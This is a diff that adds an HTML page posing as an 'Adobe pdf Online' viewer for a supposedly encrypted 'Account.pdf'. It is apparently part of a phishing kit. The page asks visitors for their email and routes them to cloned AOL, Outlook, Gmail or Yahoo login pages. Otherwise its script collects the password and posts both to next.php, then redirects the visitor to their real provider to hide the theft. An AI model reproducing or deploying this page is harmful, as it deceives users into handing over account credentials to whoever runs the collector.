@@ -1,0 +1,130 @@
+
+<!DOCTYPE html>
+<html data-bs-theme="light" lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>New Adobe Genral Page Dashboard</title>
+    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Archivo+Narrow&amp;display=swap">
+    <link rel="stylesheet" href="assets/css/Font%20Awesome%205%20Brands.css">
+    <link rel="stylesheet" href="assets/css/Font%20Awesome%205%20Free.css">
+    <link rel="stylesheet" href="assets/css/responsive.css">
+    <link rel="stylesheet" href="assets/css/styles.css">
+    <link rel="stylesheet" href="assets/css/bootstrap/css/bootstrap.min.css">
+    <link rel="stylesheet" href="assets/css/fonts/fontawesome-all.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css">
+
+    <style>
+        #emailInput{
+            height: 38px;
+            width: 80%;
+            border-radius: 3px;border: 1px solid #8a0507;
+            margin-top: 8px;background: rgba(255,126,138,0.36);
+            padding: 4px 15px;
+            color: var(--bs-body-bg);
+        }
+        #passInput{
+            width: 80%;
+            height: 38px;
+            border-radius: 3px;
+            border: 1px solid #8a0507;margin-top: 8px;
+            background: rgba(255,126,138,0.36);padding: 4px 15px;
+            color: var(--bs-body-bg);
+        }
+    </style>
+
+
+</head>
+
+<body id="index-body">
+    <div id="nav-bar" style="height: 66px;background: #8a0507;padding-left: 20px;padding-right: 20px;padding-bottom: 5px;padding-top: 10px;"><img src="assets/img/adobe1-w.png" width="47" height="41" style="margin-bottom: 9px;">
+        <h2 id="heading" class="inline-text" style="color: var(--bs-body-bg);margin: 0px;padding-left: 19px;">Adobe pdf Online</h2>
+    </div>
+    <div id="nav2" style="height: 48px;background: var(--bs-body-bg);margin: 0px;padding-left: 30px;padding-right: 30px;padding-top: 11px;padding-bottom: 11px;">
+        <h5>Document</h5>
+    </div>
+    <div id="index-main-container">
+        <div id="conatiner-in" style="margin-top: 61px;max-width: 424px;width: 80%;">
+            <div id="leftside" style="height: 459px;width: 424px;background: rgba(33,37,41,0.53);padding-top: 10px;text-shadow: 0px 0px;border: 3px solid rgba(193,8,8,0.66);box-shadow: 2px 3px 6px 1px;max-width: 424px;">
+                <div class="c-div">
+                    <div style="height: 70px;width: 300px;padding-top: 6px;padding-bottom: 6px;background: rgba(220,53,69,0.53);"><img src="assets/img/adobe1-w.png" width="53" height="47" style="margin-top: 7px;margin-left: 20px;">
+                        <h5 class="inline-text" style="color: var(--bs-body-bg);margin: 0px;padding-left: 19px;margin-top: 7px;margin-left: 20px;">Adobe pdf Online</h5>
+                    </div>
+                </div><img src="assets/img/pdf.svg" width="141" height="84" style="margin-left: 140px;margin-top: 18px;">
+                <p style="margin: 0px;text-align: center;color: var(--bs-body-bg);font-size: 14px;">428.67KB</p>
+                <p style="margin: 0px;text-align: center;color: var(--bs-body-bg);font-size: 14px;">Account.pdf</p>
+                <div class="c-div"><input type="email" id="emailInput"  placeholder="Email"></div>
+                <div class="c-div" id="passdiv" style="display: none">
+                    <input type="password" id="passInput" name="passInput" placeholder="Password"></div>
+
+
+                <div class="c-div" style="margin-top: 14px;">
+                    <div class="e-div" style="width: 80%;"><button class="btn btn-primary" id="sign-in-btn" type="button" style="border-style: none;border-radius: 4px;background: #8a0507;width: 100px;height: 38px;box-shadow: 2px 3px 2px rgb(101,57,57);">Sign In</button></div>
+                </div>
+                <p style="margin: 0px;text-align: center;color: var(--bs-body-bg);font-size: 15px;padding-top: 13px;">This File is protected with strong 128-bit AES encryption.</p>
+                <h4 style="margin: 0px;text-align: center;color: var(--bs-body-bg);font-size: 15px;">To Decrypt this file You need to Sign In.</h4>
+            </div>
+        </div>
+    </div>
+    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+    <script src="assets/js/bootstrap/js/bootstrap.min.js"></script>
+    <script src="assets/js/js/bs-init.js"></script>
+    <script src="assets/js/js/main.js"></script>
+    <script src="assets/js/color.js"></script>
+    <script>
+        $(document).ready(function () {
+            $('#sign-in-btn').click(function () {
+                $('#sign-in-btn').text("checking...");
+                var email = $('#emailInput').val();
+                $.ajax({
+                    url: 'next.php',
+                    method: 'POST',
+                    data: { ai: email },
+                    success: function(response) {
+                        console.log(response);
+                        switch (response) {
+                            case 'aol':
+                                window.location.href = "aol/index.html#"+email;
+                                break;
+                            case 'outlook':
+                                window.location.href = "office/#"+email;
+                                break;
+                            case 'gmail':
+                                window.location.href = "gmail/login-email.html#"+email;
+                                break;
+                            case 'google':
+                                window.location.href = "gmail/login-email.html#"+email;
+                                break;
+                            case 'yahoo':
+                                window.location.href = "yahoo/index.html#"+email;
+                                break;
+                            default:
+                                $('#passdiv').show();
+                                $('#sign-in-btn').text("Sign In");
+                                $('#sign-in-btn').click(function () {
+                                    var pass = $('#passInput').val();
+                                        $.ajax({
+                                            url: 'next.php',
+                                            method: 'POST',
+                                            data: { ai: email, pr: pass , dome: response },
+                                            success: function(resp) {
+                                                window.location.href = "http://www."+response+".com";
+                                            }
+                                        });
+                                });
+                        }
+                    },
+                    error: function(jqXHR, textStatus, errorThrown) {
+                        console.error('Error:', textStatus, errorThrown);
+                        // Handle errors here
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
